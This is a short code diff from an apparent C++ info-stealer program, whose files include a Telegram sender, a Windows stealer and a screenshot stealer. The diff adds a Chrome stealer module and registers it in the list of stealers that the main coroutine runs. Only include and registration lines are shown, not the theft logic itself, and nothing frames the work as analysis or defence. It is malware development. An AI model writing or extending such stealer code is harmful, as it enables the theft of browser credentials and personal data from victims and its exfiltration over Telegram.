@@ -13,6 +13,7 @@
 #include "senders/sender.h"
 #include "senders/telegram_sender.h"
 #include "stealers/base_stealer.h"
+#include "stealers/chrome_stealer.h"
 #include "stealers/srceenshot_stealer.h"
 #include "stealers/win_stealer.h"
 
@@ -122,6 +123,7 @@ asio::awaitable<void> co_main()
     std::vector<std::unique_ptr<base_stealer_t>> stealers;
     stealers.emplace_back(std::make_unique<win_stealer_t>());
     stealers.emplace_back(std::make_unique<srceenshot_stealer_t>());
+    stealers.emplace_back(std::make_unique<chrome_stealer_t>());
 
     std::vector<asio::awaitable<void>> tasks;
     for (auto& st : stealers)
